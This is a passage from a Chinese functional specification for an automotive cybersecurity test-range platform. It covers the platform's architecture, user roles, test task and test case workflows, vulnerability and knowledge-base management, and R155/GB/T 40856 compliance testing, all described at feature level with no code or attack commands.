title="技术架构描述"></a>技术架构描述</h2><p>该安全检测平台采用微服务架构设计，前后端分离，前端组件化开发，REST接口设计。以下是平台的主要组件和技术选型：</p><p>1.前端开发</p><p>使用现代化的前端框架，如React、Vue.js或Angular，实现前端页面的组件化开发。使用Webpack或Parcel等工具进行代码打包和构建。前端页面通过REST接口与后端进行通信，获取数据并展示。</p><p>2.后端开发</p><p>使用微服务架构，将不同功能模块拆分为独立的服务。使用Spring Boot或Node.js等框架开发微服务。使用RESTful风格设计API接口，提供数据和功能的访问。使用JSON或其他标准数据格式进行数据交互。</p><p>3.数据实时通信交互技术</p><p>使用WebSocket协议实现实时通信，用于平台和客户端之间的双向通信。使用Socket.io、SignalR等库简化WebSocket的使用。通过实时通信技术，可以实现实时推送更新、通知和进度信息等功能。</p><p>4.缓存数据库</p><p>使用Redis或Memcached等缓存数据库，用于缓存频繁访问的数据，提高读取性能。将常用的查询结果、计算结果等存储在缓存数据库中，减少对主数据库的访问。</p><p>5.异步任务执行队列</p><p>使用消息队列系统，如RabbitMQ、Kafka或ActiveMQ，实现异步任务的执行队列。将需要异步执行的任务放入消息队列中，由消费者进行处理。通过消息队列可以实现任务的解耦和削峰填谷，提高系统的稳定性和吞吐量。</p><p>6.多线程处理任务状态：</p><p>在任务处理过程中，使用多线程技术提高任务处理的并发性和效率。使用线程池管理线程资源，避免频繁创建和销毁线程。使用锁、信号量等机制确保多线程访问共享资源的安全性。</p><p>7.负载均衡和分布式部署</p><p>使用负载均衡器（如Nginx、HAProxy等）将请求分发到多个后端服务实例。将微服务部署在多个服务器上，实现分布式部署，提高系统的可用性和扩展性。使用容器化技术（如Docker、Kubernetes）简化部署和管理。</p><p>8.配置第三方访问源授权</p><p>使用OAuth、JWT等认证和授权机制，实现对第三方访问源的授权验证。在平台中集成认证服务器或使用第三方认证服务，对访问源进行认证和授权。确保只有经过授权的访问源可以访问平台的API接口和功能。</p><p>9.对接靶场基础平台的零部件及系统测试任务同步；</p><p>10.对接靶场检测结果，进行报告统计汇总。</p><h2 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h2><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><ol><li>权限划分</li></ol><p>系统管理员拥有最高权限，可以管理用户、角色、审批和审计等功能。管理员可以创建和管理不同角色，并为每个角色分配相应的权限。权限可以细分为模块级别或功能级别，以控制用户对系统各个功能的访问权限。</p><ol><li>用户管理</li></ol><p>管理员可以创建、编辑和删除用户账号。用户账号包括基本信息（如用户名、密码、邮箱等）和角色信息。管理员可以为用户分配角色，控制用户在系统中的权限。用户可以使用工作邮箱注册账户，注册审核功能确保新用户的身份验证，并通过邮件通知审核结果。支持用户账号的禁用和启用操作。用户支持修改、重置自己用户登录密码，密码密文传出</p><ol><li>角色管理</li></ol><p>管理员可以创建、编辑和删除角色。支持角色的禁用和启用操作。<br>角色定义了一组权限，用于控制用户对系统功能的访问。每个角色可以包含多个权限，可以根据实际需求进行灵活配置5种角色权限，支持自定义角色（实验室负责人/测试接口人/测试执行人/三方服务人员/审计人员）</p><p>实验室负责人的职责：</p><p>创建测试车型和相关测试任务。</p><p>分配测试专业接口人，并生成审核列表。</p><p>管理待审核内容，并支持查询、审批、查看详情和驳回等操作。</p><p>查看测试人员和整体测试状态与进展。</p><p>测试专业接口人的职责：</p><p>接收并管理车型测试任务，包括邮件通知。</p><p>制定和上传测试计划、规范文件和需求文件。</p><p>分配权限给相关用户，发送邮件通知测试人员。</p><p>提交测试计划至上级审批，并查看测试状态与进展。</p><p>测试执行人的职责：</p><p>接收具体测试项任务，并能提出修改测试计划的建议。</p><p>确认并提交测试计划至上级审批。</p><p>执行测试任务，并创建与三方服务人员关联的任务。</p><p>三方服务人员的权限：</p><p>限定于车型测试相关工作的访问权限</p><ol><li>审批功能</li></ol><p>支持审批流程的自定义审批节点模板功能，并支持应用在不同模块的审批流程中，用于处理系统中的审批事务。管理员可以创建、编辑和删除审批流程，并指定参与审批的角色。审批流程可以包括多个审批节点，每个节点可以指定审批人员和审批条件。支持审批记录的查看和审批状态的跟踪。审批支持向相关用户发送电子邮件。</p><ol><li>审计功能</li></ol><p>系统会记录用户的操作日志和系统事件，用于审计和追踪用户行为。记录的信息包括记录用户的操作日志，包括登录、计划制定、任务创建、执行、漏洞信息编写等等。管理员可以查看和导出审计日志，支持多维度筛选条件，如时间、任务、车型、测试人等，以便于查看和审计日志</p><ol><li>升级功能</li></ol><p>显示系统升级的历史记录，包括版本号、状态、类型、时间和内容，升级内容存放于升级包中，并在升级过程中记录显示。</p><p>这些功能设计将确保智能汽车网络靶场检测平台能够高效、安全地管理用户权限、审核和审计过程，同时提供灵活的工作流程以适应不同的测试需求。每个功能都应该有一个用户友好的界面，以便于操作，并保证数据安全和隐私。</p><h3 id="车型管理"><a href="#车型管理" class="headerlink" title="车型管理"></a>车型管理</h3><p>车型管理功能描述</p><ol><li>管理测试车型</li></ol><p>支持创建、编辑和删除测试车型的信息。测试车型信息包括车型名称、描述、版本等。可以为每个测试车型指定相关的控制器和测试项。</p><ol><li>管理通用控制器</li></ol><p>支持创建、编辑和删除通用控制器的信息。通用控制器是用于测试车型的硬件设备，如ECU（电子控制单元）。控制器信息包括名称、型号、供应商等。</p><ol><li>管理通用测试项</li></ol><p>支持创建、编辑和删除通用测试项的信息。通用测试项是用于测试车型的功能和网络测试。测试项可以包括测试功能（如加速度、制动等）和测试网络（如CAN总线、以太网等）。</p><ol><li>设置相关车型接口人</li></ol><p>支持为每个测试车型指定相关的接口人。接口人负责与车型相关的沟通和协调工作。可以设置接口人的联系信息，方便沟通和协作。</p><ol><li>需求文档管理</li></ol><p>支持上传、下载和管理与测试车型相关的需求文档。需求文档可以包括车型规格、功能要求、性能要求等。管理员和相关人员可以查看和更新需求文档。</p><ol><li>整体测试进度和测试内容规划</li></ol><p>支持对车型进行整体测试进度和测试内容的规划。可以设定测试计划、测试阶段和测试任务。管理员和相关人员可以查看和更新测试进度和测试内容。</p><ol><li>统计功能</li></ol><p>支持对车型测试数据进行统计和分析。可以生成测试报告、测试指标图表和统计数据。管理员和相关人员可以查看和导出统计结果。</p><h3 id="计划管理"><a href="#计划管理" class="headerlink" title="计划管理"></a>计划管理</h3><p>计划管理功能描述：</p><ol><li>分权限展示计划内容</li></ol><p>根据用户权限的不同，系统会展示相应的计划内容。管理员可以查看、编辑和删除所有计划。普通测试人员只能查看和编辑自己负责的计划。</p><ol><li>规划测试项的具体测试时间</li></ol><p>测试人员可以在计划中为每个测试项指定具体的测试时间。可以设定开始时间、结束时间和持续时间等。支持设置测试项的优先级和重要性，以便进行合理的时间规划。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示计划的统计信息。可以统计不同状态的计划数量，如已完成、进行中、未开始等。支持生成图表和报表，以便更直观地了解计划的执行情况。</p><ol><li>审核功能</li></ol><p>支持计划的审核流程，确保计划的合理性和准确性。管理员可以审核计划，并进行批准或拒绝操作。审核记录会被记录下来，以便追溯和审计。</p><h3 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h3><p>任务管理功能描述：</p><ol><li>创建测试任务</li></ol><p>根据测试计划， 支持创建手动测试任务（比如硬件测试：按照定义用例步骤上传图片）选择自定义用例执行时根据用例步骤上传执行过程图片、log等。可以创建针对每个测试项的测试任务。每个测试任务包括测试项名称、测试人员、开始时间、结束时间等信息。可以将测试任务分配给指定的测试人员进行执行。</p><ol><li>测试任务执行</li></ol><p>支持管理不同测试任务的执行状态和进度。可以同时执行多个测试任务，实现并行测试。管理员可以监控测试任务的执行情况，并进行必要的调整和协调。</p><ol><li>状态查询</li></ol><p>可以查看每个测试任务的相关测试需求和所需的工具占用情况。</p><p>显示测试任务的当前状态，如进行中、已完成等。</p><ol><li>执行状态</li></ol><p>展示测试任务的等待序列，即等待执行的任务列表。实时展示测试任务的执行状态比如用例的执行进度和结果，包括开始时间、结束时间和进度等。</p><ol><li>用例详情</li></ol><p>提供每个测试任务中用例的详细信息，包括测试步骤、需求和预期结果。可以查看和编辑用例的具体内容，方便测试人员进行测试执行。</p><ol><li>漏洞生成</li></ol><p>当测试任务中的某个用例执行失败时，系统可以自动生成相应的漏洞记录。漏洞记录包括用例名称、失败原因和建议修复措施等信息。</p><ol><li>测试结果管理</li></ol><p>任务执行完成，支持展示测试结果，下载报告、log、测试用例（包含步骤）测试计划内容等文件包。支持显示每个测试任务的测试结果，包括通过、失败和未执行等状态。管理员可以对测试结果进行管理，如标记为已复查、重新执行等操作。</p><ol><li>结果下载</li></ol><p>提供下载功能，可以下载测试报告、用例、测试内容计划等相关文档。方便用户查阅和分享测试相关的文档和报告。</p><ol><li>统计功能：</li></ol><p>提供统计功能，用于分析和展示测试任务的统计信息。可以统计不同状态的测试任务数量，如已完成、进行中、未开始等。支持生成图表和报表，以便更直观地了解测试任务的执行情况。</p><h3 id="用例管理"><a href="#用例管理" class="headerlink" title="用例管理"></a>用例管理</h3><p>用例管理功能描述：</p><ol><li>用例总览和分类展示</li></ol><p>提供用例总览页面，展示所有的测试用例。支持测试用例自定义编写、分类查询、添加、删除、修改等功能。支持按分类进行展示，如功能分类、网络分类等。用户可以根据需要选择特定的分类进行查看和管理，包括支持关联测试项，并按照测试项分类。 测试用例统一管理，可按类型、测试方向等条件筛选，显示审批状态和引用次数等统计信息。</p><ol><li>编辑测试用例</li></ol><p>用户可以编辑测试用例，包括用例名称、描述、前置条件、测试步骤和预期结果等信息。支持对测试步骤进行编辑，包括添加、删除和修改步骤。用户可以根据实际需求灵活地编辑测试用例的内容。方便自动化测试脚本开发及测试执行调用。测试用例步骤编写以及能在结果中结果展示分为自动化测试用例（调用工具）和手动添加测试用例。</p><ol><li>关联测试需求</li></ol><p>支持将测试用例与相关的测试需求进行关联。支持为指定的待测试设备或者测试方向，应用特定的测试用例，极大程度增加实际操作情景的便利性。用户可以在用例管理界面选择关联的测试需求，以便更好地跟踪和管理测试用例的执行情况。测试用例编写支持关联需求文档，需求类别、编号等。执行该用例的测试任务可查看关联的需求文档，和需求编号等信息。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示测试用例的统计信息。可以统计不同分类的用例数量，如功能用例、网络用例等。支持生成图表和报表，以便更直观地了解用例的分布和执行情况。支持上传用例模板，支持按照模板格式下载测试用例。</p><ol><li>审核功能</li></ol><p>支持测试用例的审核流程，确保用例的准确性和可执行性。管理员可以审核用例，并进行批准或拒绝操作。审核记录会被记录下来，以便追溯和审计。定制的测试用例具有编写、试用、发布等状态。支持审核功能，提交到实验室负责人角色进行审核，审核后即可更新到关联模块中。</p><ol><li>管理功能</li></ol><p>提供管理功能，用户可以对测试用例进行管理操作。包括创建、编辑、删除用例等操作。管理员可以管理所有用例，普通用户只能管理自己创建的用例。</p><ol><li>通用测试项（功能、网络）管理</li></ol><p>支持管理通用测试项，如功能测试项和网络测试项等。用户可以创建和编辑通用测试项，以便在用例中进行引用和关联。通用测试项的管理可以提高用例的复用性和效率。</p><h3 id="结果管理"><a href="#结果管理" class="headerlink" title="结果管理"></a>结果管理</h3><p>结果管理功能描述：</p><ol><li>测试结果总览</li></ol><p>提供测试结果总览页面，展示所有的测试结果。用户可以查看不同测试任务的测试结果，包括通过、失败和未执行跳过等状态。</p><ol><li>结果详情展示</li></ol><p>用户可以查看每个测试结果的详细信息。结果详情包括测试用例名称、执行状态、失败原因和建议修复措施等内容。用户可以通过结果详情了解每个测试用例的执行情况和问题。</p><ol><li>管理功能</li></ol><p>提供管理功能，用户可以对测试结果进行管理操作。包括标记为已复查、重新执行、关闭等操作。管理员可以管理所有测试结果，普通用户只能管理自己相关的测试结果。</p><ol><li>统计功能</li></ol><p>提供统计功能，用于分析和展示测试结果的统计信息。可以统计不同状态的测试结果数量，如通过、失败和未执行等。支持生成图表和报表，以便更直观地了解测试结果的分布和趋势。</p><ol><li>单个任务测试结果展示</li></ol><p>结果管理功能可以与任务管理功能进行集成。在任务管理界面，用户可以查看每个测试任务的单独测试结果。这样可以方便用户从任务的角度查看和管理测试结果。</p><p>针对汽车信息安全测试，结果管理功能可以帮助用户对测试结果进行全面的管理和分析。提供测试结果总览和详情展示，方便用户查看每个测试用例的执行情况和问题。支持管理功能，用户可以对测试结果进行标记和操作。统计功能可以帮助用户了解测试结果的整体情况和趋势。同时，结果管理功能与任务管理功能的集成可以提供更便捷的测试结果展示和管理体验。</p><h3 id="工具管理"><a href="#工具管理" class="headerlink" title="工具管理"></a>工具管理</h3><p>工具管理功能描述：</p><ol><li>工具接入权限管理</li></ol><p>提供对工具接入权限的管理功能。管理员可以配置哪些用户或角色可以访问和使用特定的工具。用户可以查看和配置自己的工具接入权限。提供一个向导或表单，允许用户添加新工具和配置其连接设置。这包括输入工具的基本信息、版本、描述以及任何必要的连接参数。</p><ol><li>工具使用记录</li></ol><p>记录每个用户对工具的使用情况。包括使用时间、使用工具、使用目的等信息。用户可以查看自己的工具使用记录，管理员可以查看所有用户的记录包括已接入和未接入的工具以及工具的版本和描述；。</p><ol><li>工具状态展示</li></ol><p>提供工具占用状态的展示功能。用户可以查看工具的当前占用情况，包括是否被占用、占用者和占用时间等信息。这样可以避免多个用户同时占用同一个工具的情况。实现一个状态监测系统，用于实时更新工具的在线或离线状态。在用户界面上，为每个工具显示当前状态（在线/离线）。未启动的工具在界面上标记为离线状态。若工具处于离线状态，其相关的任务在用户界面上标记为不可执行，并提供相应提示。</p><ol><li>内置工具说明文件</li></ol><p>提供内置工具说明文件，包含每个工具的详细说明和使用方法。用户可以查看工具的说明文件，以便了解工具的功能和使用方式。这样可以帮助用户更好地使用和配置工具。</p><ol><li>调用API</li></ol><p>支持通过API调用工具管理功能。用户可以通过API进行工具接入权限的配置、工具使用记录的查询等操作。这样可以方便集成工具管理功能到其他系统或工具中。</p><ol><li>统计功能</li></ol><p>提供使用统计功能，用于分析收集和展示工具的使用频率、使用时长、错误率、使用者分布等信息。支持生成图表和报表，以便更直观地了解工具的使用情况。</p><p>通过以上工具管理功能，用户可以方便地管理和配置工具的接入权限，查看工具使用记录和占用状态。提供内置工具说明文件，帮助用户了解工具的功能和使用方法。支持通过API调用工具管理功能，方便集成到其他系统或工具中。同时，使用统计功能可以帮助用户了解工具的使用情况和趋势，以便进行优化和调整。</p><h3 id="知识库管理"><a href="#知识库管理" class="headerlink" title="知识库管理"></a>知识库管理</h3><p>知识库管理功能描述：</p><ol><li>自定义文件结构</li></ol><p>提供自定义的文件结构，用户可以根据需要创建文件夹和文件，组织知识库的内容。用户可以创建多层级的文件夹，以便更好地分类和管理知识库的文档。实现一个文件管理系统，用于上传、存储和管理资料文件。支持的文件类型应包括文档、PDF、图片等。允许用户上传系统整体介绍、软件使用说明等文件实现下载功能，允许用户下载已上传的文件。提供删除功能，允许用户删除不再需要的文件。应确保所有文件传输过程中的安全性，防止数据泄露。</p><ol><li>导入文档</li></ol><p>支持导入漏洞积累和漏洞利用方面的文档。用户可以将已有的漏洞文档导入到知识库中，以便来存储、管理和分享关于入侵检测与防御测试系统的重要资料和知识。</p><ol><li>编辑文档</li></ol><p>提供文档编辑功能，用户可以在知识库中创建和编辑文档。用户可以使用富文本编辑器，对文档进行格式化和排版，以便更好地呈现内容。允许用户创建自定义的文件目录结构，以便于组织和管理文件。支持创建多级目录，以适应复杂的文件组织需求。提供拖放界面，使得用户可以方便地移动文件到不同的目录。目录结构应该可视化，允许用户一目了然地看到文件的组织方式。</p><p>提供一个文本编辑器，支持富文本编辑，允许用户编辑和格式化文本。编辑器支持在文本中插入图片，以丰富漏洞利用方法的描述。允许用户保存和更新编辑好的知识内容。提供搜索功能，便于用户检索特定的知识条目。支持在文档中添加图片。用户可以上传图片文件，并将其插入到文档中，以便更直观地展示内容。</p><ol><li>上传附件</li></ol><p>支持上传附件文件到知识库中。用户可以上传各种类型的附件文件，如PDF、Word文档、压缩包等。这样可以将相关的文件和文档整合在一起，方便用户查看和下载。</p><p>通过以上知识库管理功能，用户可以自定义文件结构，灵活组织知识库的内容。支持导入漏洞积累和漏洞利用文档，方便用户管理和共享相关的知识。提供文档编辑功能，支持富文本编辑和格式化排版，以便更好地呈现内容。用户可以在文档中添加图片，增强内容的可视化效果。同时，支持上传附件文件，将相关文件和文档整合在一起，方便用户查看和下载。这些功能能够有效地管理和利用知识库的内容，提高信息的共享和利用效率。</p><h3 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h3><p>漏洞管理功能描述：</p><ol><li>靶场漏洞数据库离线更新</li></ol><p>支持离线更新靶场漏洞数据库，确保漏洞信息的及时性和准确性。用户可以下载最新的漏洞数据库文件，并进行更新操作。</p><ol><li>车型漏洞管理</li></ol><p>支持按车型分类管理漏洞，在漏洞库界面上提供排序功能，可以根据漏洞等级进行升序或降序排序实现一个搜索功能，提供漏洞等级的筛选器，以便用户可以根据等级查找漏洞。定期从漏洞扫描工具获取最新的漏洞库信息，保持数据的时效性。为车型相关的缺陷信息设计一个单独的数据库或数据表。显示的信息包括：发现日期、缺陷描述、关联车型、零部件等方便用户根据车型进行漏洞管理和查询。用户可以创建车型分类，并将相关漏洞进行关联和管理。</p><ol><li>漏洞导入和导出</li></ol><p>设计一个API接口，允许外部系统或工具调用，获取漏洞库信息。该接口应当提供必要的认证和授权机制，确保数据的安全。支持漏洞的导入和导出功能，方便用户进行数据迁移和共享。用户可以导入漏洞数据文件，将漏洞信息快速导入到系统中。同样，用户也可以将漏洞数据导出为文件，以便在其他系统或工具中使用。</p><ol><li>任务自动生成</li></ol><p>支持自动生成任务，根据漏洞信息自动创建相关的测试任务。用户可以选择特定的漏洞，系统将自动创建相应的测试任务，提高测试效率。</p><ol><li>漏洞合并</li></ol><p>支持合并相同的漏洞，避免重复管理和测试。当系统检测到相同的漏洞时，用户可以选择合并这些漏洞，以减少冗余的管理和测试工作。</p><ol><li>漏洞来源展示</li></ol><p>提供漏洞来源的展示功能，用户可以了解每个漏洞的来源信息。漏洞信息至少包括：CVE编号、CNNVD编号、漏洞名称、影响版本、影响模块、漏洞等级，允许用户通过漏洞编号、名称进行模糊查询。这样可以帮助用户更好地追踪和分析漏洞的产生原因和传播途径。</p><ol><li>自动CVSS3.0评分计算</li></ol><p>支持自动计算漏洞的CVSS3.0评分，以评估漏洞的严重程度。用户可以查看每个漏洞的CVSS3.0评分，以便进行风险评估和优先级排序。</p><ol><li>展示步骤和FAIL项附件</li></ol><p>支持展示漏洞的测试步骤和在报告中体现FAIL项附件。用户可以查看每个漏洞的测试步骤，以便了解漏洞的验证过程。在报告中，可以将FAIL项的附件直接关联到漏洞，以提供更详细的信息。</p><ol><li>管理功能和统计功能</li></ol><p>提供漏洞管理功能，包括添加、编辑、删除漏洞等操作。车型缺陷管理数据支持两种数据来源：平台测试产生的缺陷和手动导入的excel缺陷信息。允许手动删除数据条目。平台自产生的数据可以通过回归测试结果自动删除。支持统计功能，可以统计漏洞的数量、分类、状态等信息，以便进行分析和报告。</p><ol><li>知识库导出文档</li></ol><p>支持将漏洞利用文档导出到知识库，方便共享和管理。用户可以选择特定的漏洞利用文档，将其导出到知识库中，便于后续的利用和参考。支持在线编辑漏洞利用文档，用户可以直接在系统中进行编辑和更新。提供富文本编辑器，支持格式化和排版功能，以便更好地呈现和编辑文档内容。</p><p>通过以上漏洞管理功能，用户可以灵活管理靶场漏洞数据库，按车型分类进行漏洞管理。支持漏洞的导入和导出，以及自动生成相关测试任务。用户可以合并相同的漏洞，减少冗余的管理和测试工作。展示漏洞来源，自动计算CVSS3.0评分，展示测试步骤和在报告中体现FAIL项附件，提供详细的信息。支持管理功能和统计功能，方便用户进行漏洞管理和分析。同时，支持向知识库导出利用文档，并提供在线编辑漏洞利用文档的功能，方便用户共享和更新漏洞利用信息。这些功能能够有效地管理和利用漏洞信息，提高安全测试和漏洞利用的效率。</p><h3 id="首页管理"><a href="#首页管理" class="headerlink" title="首页管理"></a>首页管理</h3><p>首页管理功能描述：</p><ol><li>多入口支持</li></ol><p>主页提供多个入口选项，以便用户快速访问不同的功能和模块。用户可以根据自己的需求和权限，选择进入相应的功能页面。</p><ol><li>展示模块选择</li></ol><p>支持选择展示模块，用户可以根据自己的关注点和需求，自定义主页展示的模块内容。用户可以选择需要展示的模块，例如任务管理、漏洞管理、报告统计等，以便快速查看相关信息</p><ol><li>统计功能支持</li></ol><p>主页提供统计功能，可以展示各种数据和指标的统计信息。用户可以查看任务数量、漏洞数量、报告完成率等统计数据，以便进行数据分析和监控。</p><ol><li>切换展示统计图和车型拓扑图</li></ol><p>支持切换展示不同类型的统计图和车型拓扑图。用户可以选择展示柱状图、折线图、饼图等不同形式的统计图，以便更直观地呈现数据。同时，用户也可以切换展示车型拓扑图，以了解车型之间的关系和拓扑结构。</p><ol><li>快捷入口</li></ol><p>主页提供快捷入口，方便用户快速访问常用的功能和页面。用户可以将常用的功能或页面添加到快捷入口，以便一键访问，提高操作效率。</p><h3 id="车型测试综合业务管理"><a href="#车型测试综合业务管理" class="headerlink" title="车型测试综合业务管理"></a>车型测试综合业务管理</h3><ol><li>多维度条件查询</li></ol><p>提供强大的搜索引擎，支持基于多个字段和条件的综合查询。</p><ol><li>添加数据，</li></ol><p>提供用户友好的界面和工具，用于快速添加新数据。</p><ol><li>关联数据联动修改和删除</li></ol><p>实现数据关联性检查，确保在修改或删除数据时，相关联的数据能够同步更新或提示用户进行确认。提供事务性操作，保证数据操作的原子性，避免数据不一致。</p><h3 id="全面的文档管理"><a href="#全面的文档管理" class="headerlink" title="全面的文档管理"></a>全面的文档管理</h3><ol><li>文件的分享权限分配</li></ol><p>实现文档的分享功能，允许用户将文档分享给其他用户或用户组。提供细粒度的权限分配，包括查看权限、编辑权限、下载权限等。确保敏感文档的安全性，通过权限控制限制对敏感信息的访问。</p><ol><li>自定义文件夹管理不同类型文档</li></ol><p>允许用户创建自定义文件夹来组织文档。支持按文档类型、项目、部门等多种方式分类管理文档。</p><ol><li>文档预览</li></ol><p>实现在线文档预览功能，使用户无需下载即可查看文档内容。支持常见的基础文档类型预览，如合规文档、基础规范文档等</p><h3 id="对外提供测试数据和接入"><a href="#对外提供测试数据和接入" class="headerlink" title="对外提供测试数据和接入"></a>对外提供测试数据和接入</h3><ol><li>输出API接口文档</li></ol><p>API文档应详细描述每个接口的功能、请求方法、请求参数、请求示例、响应结构、响应示例、错误码等。每个请求和响应的字段都应有清晰的说明，包括字段名、字段含义、数据类型、是否必填、默认值等。对于每个参数，明确其数据类型（如字符串、整数、布尔值等）和取值范围或允许的值列表。API文档应包含版本信息，以便用户了解当前API的版本，并在API更新时做出相应的调整。</p><ol><li>配置允许的请求源接入</li></ol><p>平台支持CORS配置，允许指定的域名进行跨域请求。实施IP或域名白名单制度，只有列入白名单的请求源才能访问API接口。A提供API密钥或令牌，以便验证请求源的合法性。为了防止滥用，可以对API接口调用频率进行限制。</p><h3 id="审计功能"><a href="#审计功能" class="headerlink" title="审计功能"></a>审计功能</h3><ol><li>审计日志记录</li></ol><p>系统应自动记录所有关键操作和事件，包括用户登录/登出、数据访问、数据修改、系统设置更改、权限修改等。审计日志应包含操作时间、操作用户、操作类型、操作对象、操作结果以及操作前后的关键数据快照（如果适用）</p><h3 id="统计功能"><a href="#统计功能" class="headerlink" title="统计功能"></a>统计功能</h3><p>统计功能描述：</p><ol><li>统计图展示</li></ol><p>支持以直观的图表形式展示统计数据，如柱状图、折线图、饼图等。用户可以通过统计图快速了解数据的分布、趋势和比例等信息。</p><ol><li>统计图导出</li></ol><p>支持将统计图导出为常见的文件格式，如图片、PDF等。用户可以将统计图导出保存，以便在报告、演示或与他人共享时使用。</p><ol><li>选择统计项</li></ol><p>提供灵活的统计项选择，用户可以根据需要选择统计的具体项。统计项可以包括用例统计、缺陷统计、合规检测统计等，用户可以根据具体场景进行选择。</p><ol><li>筛选功能</li></ol><p>支持根据特定条件进行数据筛选，以便更精确地统计和分析数据。用户可以根据需要选择筛选条件，如时间范围、车型、漏洞类型等，以获取所需的统计结果。</p><p>通过以上统计功能，用户可以以直观的图表形式展示统计数据，快速了解数据的分布和趋势。支持将统计图导出为常见的文件格式，方便在报告、演示或与他人共享时使用。用户可以灵活选择统计项，根据具体场景进行统计分析。同时，提供筛选功能，用户可以根据特定条件进行数据筛选，以获取所需的统计结果。这些功能能够帮助用户更好地理解和分析数据，支持决策和优化工作流程。</p><h2 id="测试能力"><a href="#测试能力" class="headerlink" title="测试能力"></a>测试能力</h2><p>测试管理平台围绕业务领域将业务划分为管理业务与测试业务，并将不同业务分散到不同的微服务中，从而降低系统的耦合性，并提供更加灵活的服务支持。</p><p>功能参数如下：</p><ol><li>支持对整车以及零部件进行的合规测试。</li><li>支持以国内外标准为维度的测试场景。（R155/GBT-40856 等）</li><li>漏洞检测：支持提供每个漏洞项的详细描述及影响版本，漏洞等级已分级（低危、中危、高危、严重等），方便确认并完成修复。功能截图证明如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/24ea134e18fc4c304d29e30f931f9d18.png"></p><ol><li>支持以安全测试项为维度的测试场景。（硬件安全，数据安全，系统安全，软件安全，协议安全等）</li><li>支持以功能为维度的测试场景。</li><li>支持蓝牙协议，GNSS（GPS）协议，WIFI 协议等硬件检测设备。</li><li>支持对风险点的权重管理功能。（可重新分配权重等）</li><li>支持全面的自动化测试功能。（固件自动拉取检测，二进制与应用漏洞检测等）</li><li>支持详细的流程化的半自动化测试功能。（GNSS 欺骗测试，蓝牙欺骗测试等）</li><li>支持简洁合理的引导测试功能。（当无法自动化或半自动化实现时，引导测试作为补充）</li><li>支持灵活的三方测试接入功能。（可根据测试模块协议，自定义适配三方测试工具，将三方工具集成到平台）</li></ol><h3 id="标准测试"><a href="#标准测试" class="headerlink" title="标准测试"></a>标准测试</h3><p>汽车信息安全检测平台具备满足R155及GBT-40856标准的整车及零部件的合规测试能力。以下是对该能力的描述：</p><ol><li>R155标准测试能力</li></ol><p>R155是一项重要的汽车信息安全标准，要求对整车和零部件进行安全性评估和测试。我们的平台提供了全面的R155标准测试能力，能够对整车和各个零部件进行合规性测试和评估。通过平台，用户可以进行必要的测试和分析，以确保汽车系统满足R155标准的安全要求。</p><ol><li>GBT-40856标准测试能力</li></ol><p>GBT-40856是中国国家标准，涵盖了汽车信息安全的技术要求和测试方法。我们的平台具备满足GBT-40856标准的整车及零部件的合规测试能力。用户可以利用平台进行GBT-40856标准的测试，以验证汽车系统的安全性和合规性。</p><ol><li>整车合规测试能力</li></ol><p>平台支持对整车进行合规性测试，包括对整车系统的安全性评估和漏洞扫描。用户可以通过平台执行全面的整车测试，以确保整车系统满足相关的安全标准和要求。</p><ol><li>零部件合规测试能力</li></ol><p>平台还提供了针对零部件的合规性测试能力。用户可以通过平台对各个零部件进行测试和评估，以确保它们符合相关的安全标准和要求。</p><p>通过我们的汽车信息安全检测平台，用户可以借助其满足R155及GBT-40856标准的整车及零部件的合规测试能力，对汽车系统进行全面的安全性评估和合规性测试。这将有助于确保汽车系统的安全性，并满足相关的安全标准和法规要求。</p><h3 id="漏洞检测能力"><a href="#漏洞检测能力" class="headerlink" title="漏洞检测能力"></a>漏洞检测能力</h3><p>漏洞检测功能提供了以下主要特点和描述：</p><ol><li>对于每个漏洞项，提供了详细的描述，包括漏洞的原理、攻击方式、可能的影响和潜在风险等信息。</li></ol><p>每个漏洞项还会指明受影响的软件、系统或版本范围，以帮助用户了解该漏洞可能存在的具体环境和范围。</p><ol><li>漏洞等级分级：对漏洞进行了等级分级，包括低危、中危、高危、严重等级。产品功能截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/24ea134e18fc4c304d29e30f931f9d18.png"></p><p>漏洞等级的分级基于漏洞的严重程度和潜在风险，帮助用户更好地了解漏洞的紧急性和优先级。</p><p>通过以上功能，漏洞检测能够提供以下服务：</p><p>用户可以通过平台查看每个漏洞项的详细描述，了解漏洞的原理、攻击方式和可能的影响。平台会明确指出受影响的软件、系统或版本范围，帮助用户了解漏洞可能存在的具体环境和范围。漏洞等级的分级将帮助用户评估漏洞的严重程度和潜在风险，并根据等级确定紧急性和优先级。用户可以根据漏洞的描述和等级信息，采取相应的补救措施和安全措施，以降低漏洞带来的风险。</p><p>通过我们的漏洞检测功能，用户可以全面了解每个漏洞项的详细描述和影响版本，以及漏洞等级的分级。这将有助于用户及时采取措施修复漏洞，提高系统的安全性，并降低潜在风险。</p><h2 id="测试场景"><a href="#测试场景" class="headerlink" title="测试场景"></a>测试场景</h2><p>测试场景功能提供了以下主要特点和描述：</p><ol><li>场景测试：</li></ol><p>我们的平台支持多个维度的测试场景，包括硬件安全、数据安全、系统安全、软件安全和协议安全等。用户可以选择不同的测试场景来评估汽车系统在这些方面的安全性和合规性。</p><ol><li>支持多种硬件检测设备和协议</li></ol><p>我们的平台支持蓝牙协议、GNSS（GPS）协议、WIFI协议等硬件检测设备。用户可以利用这些设备进行相关的测试，以验证汽车系统在这些协议上的安全性和合规性。</p><ol><li>风险点权重管理功能</li></ol><p>平台提供了对风险点的权重管理功能，用户可以根据实际情况重新分配权重，以准确评估风险的严重程度。这有助于用户更好地理解和处理不同风险点的重要性，并根据权重确定测试和修复的优先级。</p><ol><li>全面的自动化测试功能</li></ol><p>平台支持全面的自动化测试功能，包括固件自动拉取检测、二进制与应用漏洞检测等。用户可以利用自动化测试功能快速扫描和识别潜在的漏洞和安全问题。</p><ol><li>流程化半自动化测试功能</li></ol><p>平台提供了详细的流程化半自动化测试功能，例如GNSS欺骗测试、蓝牙欺骗测试等。用户可以按照指定的流程进行测试，并根据测试结果进行评估和分析。</p><ol><li>引导测试功能</li></ol><p>当无法自